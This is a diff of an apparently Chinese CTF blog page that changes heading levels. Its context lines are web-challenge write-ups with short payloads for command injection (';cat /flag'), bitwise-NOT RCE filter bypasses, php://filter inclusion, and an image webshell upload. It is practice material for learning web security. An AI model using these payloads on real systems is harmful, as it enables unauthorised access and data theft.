-          <a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="二十三、[LitCTF 2023]PHP是世界上最好的语言！！"></a>二十三、[LitCTF 2023]PHP是世界上最好的语言！！</h2>
+        <h1 id="二十三、-LitCTF-2023-PHP是世界上最好的语言！！"   >
+          <a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="二十三、[LitCTF 2023]PHP是世界上最好的语言！！"></a>二十三、[LitCTF 2023]PHP是世界上最好的语言！！</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111509396.png" alt="image-20240111150904300"></p>
 <p>有一个RUN CODE按钮，试着输入一些命令运行</p>
 <p>查看根目录下的文件，输入命令</p>
@@ -2684,8 +2909,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111508663.png" alt="image-20240111150824586"></p>
 <p>获得flag</p>
 
-        <h2 id="二十四、-ZJCTF-2019-NiZhuanSiWei"   >
-          <a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="二十四、[ZJCTF 2019]NiZhuanSiWei"></a>二十四、[ZJCTF 2019]NiZhuanSiWei</h2>
+        <h1 id="二十四、-ZJCTF-2019-NiZhuanSiWei"   >
+          <a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="二十四、[ZJCTF 2019]NiZhuanSiWei"></a>二十四、[ZJCTF 2019]NiZhuanSiWei</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111625835.png" alt="image-20240111162515769"></p>
 <p>阅读代码可知，用GET方法传入参数text，file和password</p>
 <p>首先<code>$text</code> 所指向的文件内容要为字符串 “welcome to the zjctf”，变量 <code>$file</code> 中的字符串不能包含 “flag”，接着执行<code>$file</code> 变量指向的文件，后面有提示是useless.php，再反序列化 <code>$password</code> 变量的内容</p>
@@ -2715,8 +2940,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111623764.png" alt="image-20240111162302692"></p>
 <p>得到flag</p>
 
-        <h2 id="二十五、-BJDCTF-2020-easy-md5"   >
-          <a href="#二十五、-BJDCTF-2020-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十五、-BJDCTF-2020-easy-md5" class="headerlink" title="二十五、[BJDCTF 2020]easy_md5"></a>二十五、[BJDCTF 2020]easy_md5</h2>
+        <h1 id="二十五、-BJDCTF-2020-easy-md5"   >
+          <a href="#二十五、-BJDCTF-2020-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十五、-BJDCTF-2020-easy-md5" class="headerlink" title="二十五、[BJDCTF 2020]easy_md5"></a>二十五、[BJDCTF 2020]easy_md5</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111634746.png" alt="image-20240111163441663"></p>
 <p>此题在BUU做过，但是这里没有告知源码</p>
 <p>抓包一下，看到有个hint</p>
@@ -2736,8 +2961,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111640690.png" alt="image-20240111164012624"></p>
 <p>得到flag</p>
 
-        <h2 id="二十六、-LitCTF-2023-导弹迷踪"   >
-          <a href="#二十六、-LitCTF-2023-导弹迷踪" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十六、-LitCTF-2023-导弹迷踪" class="headerlink" title="二十六、[LitCTF 2023]导弹迷踪"></a>二十六、[LitCTF 2023]导弹迷踪</h2>
+        <h1 id="二十六、-LitCTF-2023-导弹迷踪"   >
+          <a href="#二十六、-LitCTF-2023-导弹迷踪" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十六、-LitCTF-2023-导弹迷踪" class="headerlink" title="二十六、[LitCTF 2023]导弹迷踪"></a>二十六、[LitCTF 2023]导弹迷踪</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427123.png"></p>
 <p>一个游戏界面，看看源代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427237.png" alt="image-20240112142742145"></p>
@@ -2746,8 +2971,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121428674.png" alt="image-20240112142825600"></p>
 <p>直接得到flag</p>
 
-        <h2 id="二十七、-SWPUCTF-2021-新生赛-hardrce"   >
-          <a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="二十七、[SWPUCTF 2021 新生赛]hardrce"></a>二十七、[SWPUCTF 2021 新生赛]hardrce</h2>
+        <h1 id="二十七、-SWPUCTF-2021-新生赛-hardrce"   >
+          <a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="二十七、[SWPUCTF 2021 新生赛]hardrce"></a>二十七、[SWPUCTF 2021 新生赛]hardrce</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121431101.png" alt="image-20240112143102034"></p>
 <p>是RCE题，但是过滤了很多字符，字母也过滤了</p>
 <p>上网查了一下，可以使用取反绕过</p>
@@ -2772,8 +2997,8 @@ exit;
         <h5 id="思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html"   >
           <a href="#思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html" class="headerlink" title="思路来源：https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html"></a>思路来源：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html" >https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h5>
       
-        <h2 id="二十八、-NSSCTF-2022-Spring-Recruit-ezgame"   >
-          <a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="二十八、[NSSCTF 2022 Spring Recruit]ezgame"></a>二十八、[NSSCTF 2022 Spring Recruit]ezgame</h2>
+        <h1 id="二十八、-NSSCTF-2022-Spring-Recruit-ezgame"   >
+          <a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="二十八、[NSSCTF 2022 Spring Recruit]ezgame"></a>二十八、[NSSCTF 2022 Spring Recruit]ezgame</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121720198.png" alt="image-20240112172024966"></p>
 <p>查看网页源代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121722265.png" alt="image-20240112172220181"></p>
@@ -2781,8 +3006,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121723492.png" alt="image-20240112172314425"></p>
 <p>发现flag就在里面</p>
 
-        <h2 id="二十九、-GXYCTF-2019-Ping-Ping-Ping"   >
-          <a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="二十九、[GXYCTF 2019]Ping Ping Ping"></a>二十九、[GXYCTF 2019]Ping Ping Ping</h2>
+        <h1 id="二十九、-GXYCTF-2019-Ping-Ping-Ping"   >
+          <a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="二十九、[GXYCTF 2019]Ping Ping Ping"></a>二十九、[GXYCTF 2019]Ping Ping Ping</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121741716.png" alt="image-20240112174121627"></p>
 <p>先尝试输入ping命令</p>
 <p><code>;ls</code></p>
@@ -2801,8 +3026,8 @@ exit;
         <h6 id="（PS-用内联执行还能看到过滤了哪些内容）"   >
           <a href="#（PS-用内联执行还能看到过滤了哪些内容）" class="heading-link"><i class="fas fa-link"></i></a><a href="#（PS-用内联执行还能看到过滤了哪些内容）" class="headerlink" title="（PS:用内联执行还能看到过滤了哪些内容）"></a>（PS:用内联执行还能看到过滤了哪些内容）</h6>
       
-        <h2 id="三十、-LitCTF-2023-Follow-me-and-hack-me"   >
-          <a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="三十、[LitCTF 2023]Follow me and hack me"></a>三十、[LitCTF 2023]Follow me and hack me</h2>
+        <h1 id="三十、-LitCTF-2023-Follow-me-and-hack-me"   >
+          <a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="三十、[LitCTF 2023]Follow me and hack me"></a>三十、[LitCTF 2023]Follow me and hack me</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151428577.png" alt="image-20240115142835407"></p>
 <p>按它的要求，用HackBar</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432753.png" alt="image-20240115143217668"></p>
@@ -2814,8 +3039,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151445090.png" alt="image-20240115144501973"></p>
 <p>)</p>
 
-        <h2 id="三十一、-LitCTF-2023-Ping"   >
-          <a href="#三十一、-LitCTF-2023-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十一、-LitCTF-2023-Ping" class="headerlink" title="三十一、[LitCTF 2023]Ping"></a>三十一、[LitCTF 2023]Ping</h2>
+        <h1 id="三十一、-LitCTF-2023-Ping"   >
+          <a href="#三十一、-LitCTF-2023-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十一、-LitCTF-2023-Ping" class="headerlink" title="三十一、[LitCTF 2023]Ping"></a>三十一、[LitCTF 2023]Ping</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151519504.png" alt="image-20240115151942409"></p>
 <p>在框内输入127.0.0.1</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151520062.png" alt="image-20240115152034970"></p>
@@ -2841,8 +3066,8 @@ exit;
 <p><code>;cat /flag</code></p>
 <p>也能直接出</p>
 
-        <h2 id="三十二、-SWPUCTF-2021-新生赛-finalrce"   >
-          <a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="三十二、[SWPUCTF 2021 新生赛]finalrce"></a>三十二、[SWPUCTF 2021 新生赛]finalrce</h2>
+        <h1 id="三十二、-SWPUCTF-2021-新生赛-finalrce"   >
+          <a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="三十二、[SWPUCTF 2021 新生赛]finalrce"></a>三十二、[SWPUCTF 2021 新生赛]finalrce</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151544848.png" alt="image-20240115154437783"></p>
 <p>过滤了一堆命令和字符，再用取反试试(ls /)</p>
 <p><code>/?url=(~%93%8C%DF%D0);</code></p>
@@ -2878,8 +3103,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151639166.png" alt="image-20240115163941098"></p>
 <p>得到flag</p>
 
-        <h2 id="三十三、-SWPUCTF-2022-新生赛-ez-ez-php"   >
-          <a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="三十三、[SWPUCTF 2022 新生赛]ez_ez_php"></a>三十三、[SWPUCTF 2022 新生赛]ez_ez_php</h2>
+        <h1 id="三十三、-SWPUCTF-2022-新生赛-ez-ez-php"   >
+          <a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="三十三、[SWPUCTF 2022 新生赛]ez_ez_php"></a>三十三、[SWPUCTF 2022 新生赛]ez_ez_php</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221211835.png" alt="image-20240122121130778"></p>
 <p>阅读代码可知是要传入<code>file</code>参数，<code>if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; ... &#125;</code>是检查 <code>file</code> 参数的前三个字符是否是 “php”。如果是，执行大括号内的代码，否则执行 <code>else</code> 语句，末尾又提醒我们flag可能在flag.php文件内</p>
 <p>根据代码是要我们使用php伪协议并且是要用<code>php://filter</code>这种类型的</p>
@@ -2897,8 +3122,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223698.png" alt="image-20240122122322631"></p>
 <p>获得flag</p>
 
-        <h2 id="三十四、-LitCTF-2023-作业管理系统"   >
-          <a href="#三十四、-LitCTF-2023-作业管理系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十四、-LitCTF-2023-作业管理系统" class="headerlink" title="三十四、[LitCTF 2023]作业管理系统"></a>三十四、[LitCTF 2023]作业管理系统</h2>
+        <h1 id="三十四、-LitCTF-2023-作业管理系统"   >
+          <a href="#三十四、-LitCTF-2023-作业管理系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十四、-LitCTF-2023-作业管理系统" class="headerlink" title="三十四、[LitCTF 2023]作业管理系统"></a>三十四、[LitCTF 2023]作业管理系统</h1>
       <p>打开之后是一个登陆界面，查看网页源代码</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557477.png" alt="image-20240122155704390"></p>
 <p>登录</p>
@@ -2913,8 +3138,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221555294.png" alt="image-20240122155547178"></p>
 <p>获得flag</p>
 
-        <h2 id="三十五、-鹏城杯-2022-简单包含"   >
-          <a href="#三十五、-鹏城杯-2022-简单包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十五、-鹏城杯-2022-简单包含" class="headerlink" title="三十五、[鹏城杯 2022]简单包含"></a>三十五、[鹏城杯 2022]简单包含</h2>
+        <h1 id="三十五、-鹏城杯-2022-简单包含"   >
+          <a href="#三十五、-鹏城杯-2022-简单包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十五、-鹏城杯-2022-简单包含" class="headerlink" title="三十五、[鹏城杯 2022]简单包含"></a>三十五、[鹏城杯 2022]简单包含</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221602742.png" alt="image-20240122160213679"></p>
 <p>要使用POST方法传参flag，flag在/var/www/html/flag.php中</p>
 <p>包含题可以尝试php伪协议，使用HackBar给flag传入参数</p>
@@ -2940,8 +3165,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630694.png" alt="image-20240122163033643"></p>
 <p>得到flag</p>
 
-        <h2 id="三十六、-UUCTF-2022-新生赛-websign"   >
-          <a href="#三十六、-UUCTF-2022-新生赛-websign" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十六、-UUCTF-2022-新生赛-websign" class="headerlink" title="三十六、[UUCTF 2022 新生赛]websign"></a>三十六、[UUCTF 2022 新生赛]websign</h2>
+        <h1 id="三十六、-UUCTF-2022-新生赛-websign"   >
+          <a href="#三十六、-UUCTF-2022-新生赛-websign" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十六、-UUCTF-2022-新生赛-websign" class="headerlink" title="三十六、[UUCTF 2022 新生赛]websign"></a>三十六、[UUCTF 2022 新生赛]websign</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221633382.png" alt="image-20240122163337319"></p>
 <p>那我们就查看源代码，但是鼠标右键和F12都没反应，看来是被禁用了，那直接在URL前面加上</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>
@@ -2949,14 +3174,14 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221635386.png" alt="image-20240122163526317"></p>
 <p>得到flag</p>
 
-        <h2 id="三十七、-HDCTF-2023-Welcome-To-HDCTF-2023"   >
-          <a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="三十七、[HDCTF 2023]Welcome To HDCTF 2023"></a>三十七、[HDCTF 2023]Welcome To HDCTF 2023</h2>
+        <h1 id="三十七、-HDCTF-2023-Welcome-To-HDCTF-2023"   >
+          <a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="三十七、[HDCTF 2023]Welcome To HDCTF 2023"></a>三十七、[HDCTF 2023]Welcome To HDCTF 2023</h1>
       <p>是一个游戏，死了之后直接弹出弹窗</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221643437.png" alt="image-20240122164322298"></p>
 <p>提交了发现还真是flag（好突然的）</p>
 
-        <h2 id="三十八、-NSSCTF-2022-Spring-Recruit-babyphp"   >
-          <a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="三十八、[NSSCTF 2022 Spring Recruit]babyphp"></a>三十八、[NSSCTF 2022 Spring Recruit]babyphp</h2>
+        <h1 id="三十八、-NSSCTF-2022-Spring-Recruit-babyphp"   >
+          <a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="三十八、[NSSCTF 2022 Spring Recruit]babyphp"></a>三十八、[NSSCTF 2022 Spring Recruit]babyphp</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221653532.png" alt="image-20240122165356442"></p>
 <p>阅读代码可知，要想获得flag，检查 POST 数据中的 <code>a</code> 字段，要求其不含数字且 <code>intval</code> 后的结果为真；检查 <code>b1</code> 和 <code>b2</code> 字段存在，并且它们不相等，但它们的md5值相等；检查 <code>c1</code> 和 <code>c2</code> 字段不相等，都是字符串类型，且它们的md5值相等</p>
 
@@ -2973,8 +3198,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231741793.png" alt="image-20240123174130710"></p>
 <p>得到flag</p>
 
-        <h2 id="三十九、-GDOUCTF-2023-EZ-WEB"   >
-          <a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="headerlink" title="三十九、[GDOUCTF 2023]EZ WEB"></a>三十九、[GDOUCTF 2023]EZ WEB</h2>
+        <h1 id="三十九、-GDOUCTF-2023-EZ-WEB"   >
+          <a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="headerlink" title="三十九、[GDOUCTF 2023]EZ WEB"></a>三十九、[GDOUCTF 2023]EZ WEB</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905361.png" alt="image-20240123190517274"></p>
 <p>点击</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905885.png" alt="image-20240123190537804"></p>
@@ -2992,8 +3217,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909520.png" alt="image-20240123190925445"></p>
 <p>得到flag</p>
 
-        <h2 id="四十、-GDOUCTF-2023-泄露的伪装"   >
-          <a href="#四十、-GDOUCTF-2023-泄露的伪装" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十、-GDOUCTF-2023-泄露的伪装" class="headerlink" title="四十、[GDOUCTF 2023]泄露的伪装"></a>四十、[GDOUCTF 2023]泄露的伪装</h2>
+        <h1 id="四十、-GDOUCTF-2023-泄露的伪装"   >
+          <a href="#四十、-GDOUCTF-2023-泄露的伪装" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十、-GDOUCTF-2023-泄露的伪装" class="headerlink" title="四十、[GDOUCTF 2023]泄露的伪装"></a>四十、[GDOUCTF 2023]泄露的伪装</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261615869.png" alt="image-20240126161520779"></p>
 <p>查看网页源代码啥也没有，使用dirsearch扫描一下</p>
 <p>输入命令</p>
@@ -3014,8 +3239,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261613312.png" alt="image-20240126161339235"></p>
 <p>得到flag</p>
 
-        <h2 id="四十一、-HNCTF-2022-Week1-Interesting-include"   >
-          <a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="headerlink" title="四十一、[HNCTF 2022 Week1]Interesting_include"></a>四十一、[HNCTF 2022 Week1]Interesting_include</h2>
+        <h1 id="四十一、-HNCTF-2022-Week1-Interesting-include"   >
+          <a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="headerlink" title="四十一、[HNCTF 2022 Week1]Interesting_include"></a>四十一、[HNCTF 2022 Week1]Interesting_include</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261632343.png" alt="image-20240126163200256"></p>
 <p>使用GET方法传入参数filter，提示说flag在flag.php文件内</p>
 <p>使用php伪协议</p>
@@ -3026,8 +3251,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261633350.png" alt="image-20240126163332272"></p>
 <p>得到flag</p>
 
-        <h2 id="四十二、-NISACTF-2022-babyupload"   >
-          <a href="#四十二、-NISACTF-2022-babyupload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十二、-NISACTF-2022-babyupload" class="headerlink" title="四十二、[NISACTF 2022]babyupload"></a>四十二、[NISACTF 2022]babyupload</h2>
+        <h1 id="四十二、-NISACTF-2022-babyupload"   >
+          <a href="#四十二、-NISACTF-2022-babyupload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十二、-NISACTF-2022-babyupload" class="headerlink" title="四十二、[NISACTF 2022]babyupload"></a>四十二、[NISACTF 2022]babyupload</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261636508.png" alt="image-20240126163628436"></p>
 <p>文件上传题，上传一个图片马test.jpg</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261644751.png" alt="image-20240126164441680"></p>
@@ -3057,8 +3282,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261726517.png" alt="image-20240126172632448"></p>
 <p>得到flag</p>
 
-        <h2 id="四十三、-UUCTF-2022-新生赛-ez-rce"   >
-          <a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="四十三、[UUCTF 2022 新生赛]ez_rce"></a>四十三、[UUCTF 2022 新生赛]ez_rce</h2>
+        <h1 id="四十三、-UUCTF-2022-新生赛-ez-rce"   >
+          <a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="四十三、[UUCTF 2022 新生赛]ez_rce"></a>四十三、[UUCTF 2022 新生赛]ez_rce</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291616500.png" alt="image-20240129161604390"></p>
 <p>过滤了很多关键字，而且可以看出是无回显类型的，于是可以想到用转义字符，并用<code>var_dump()</code>函数输出</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(l\s /);</span><br></pre></td></tr></table></div></figure>
@@ -3081,8 +3306,8 @@ exit;
         <h6 id="RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0"   >
           <a href="#RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0" class="headerlink" title="RCE各种绕过总结：https://zhuanlan.zhihu.com/p/391439312?utm_id=0"></a>RCE各种绕过总结：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/391439312?utm_id=0" >https://zhuanlan.zhihu.com/p/391439312?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
       
-        <h2 id="四十四、-SWPUCTF-2022-新生赛-Ez-upload"   >
-          <a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="四十四、[SWPUCTF 2022 新生赛]Ez_upload"></a>四十四、[SWPUCTF 2022 新生赛]Ez_upload</h2>
+        <h1 id="四十四、-SWPUCTF-2022-新生赛-Ez-upload"   >
+          <a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="四十四、[SWPUCTF 2022 新生赛]Ez_upload"></a>四十四、[SWPUCTF 2022 新生赛]Ez_upload</h1>
       <p>同[GXYCTF2019]BabyUpload 1</p>
 <p>不过最后的flag在蚁剑里没找到，文件上传后访问</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/7d0551daade57740c3ca7319cc7065e4/test.jpg?shell=phpinfo();</span><br></pre></td></tr></table></div></figure>
@@ -3090,8 +3315,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401311451545.png" alt="image-20240131145123394"></p>
 <p>得到flag</p>
 
-        <h2 id="四十五、-HNCTF-2022-Week1-easy-html"   >
-          <a href="#四十五、-HNCTF-2022-Week1-easy-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十五、-HNCTF-2022-Week1-easy-html" class="headerlink" title="四十五、[HNCTF 2022 Week1]easy_html"></a>四十五、[HNCTF 2022 Week1]easy_html</h2>
+        <h1 id="四十五、-HNCTF-2022-Week1-easy-html"   >
+          <a href="#四十五、-HNCTF-2022-Week1-easy-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十五、-HNCTF-2022-Week1-easy-html" class="headerlink" title="四十五、[HNCTF 2022 Week1]easy_html"></a>四十五、[HNCTF 2022 Week1]easy_html</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443662.png" alt="image-20240201144308620"></p>
 <p>饼干，英文为cookie，抓包看看cookie的值</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443690.png" alt="image-20240201144347649"></p>
@@ -3105,8 +3330,8 @@ exit;
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011442912.png" alt="image-20240201144247804"></p>
 <p>获得flag</p>
 
-        <h2 id="四十六、-羊城杯-2020-easycon"   >
-          <a href="#四十六、-羊城杯-2020-easycon" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十六、-羊城杯-2020-easycon" class="headerlink" title="四十六、[羊城杯 2020]easycon"></a>四十六、[羊城杯 2020]easycon</h2>
+        <h1 id="四十六、-羊城杯-2020-easycon"   >
+          <a href="#四十六、-羊城杯-2020-easycon" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十六、-羊城杯-2020-easycon" class="headerlink" title="四十六、[羊城杯 2020]easycon"></a>四十六、[羊城杯 2020]easycon</h1>
       <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330390.png" alt="image-20240202133033288"></p>
 <p>奇奇怪怪，访问一下/index.php</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021332931.png" alt="image-20240202133202886"></p>
@@ -3129,8 +3354,8 @@ exit;
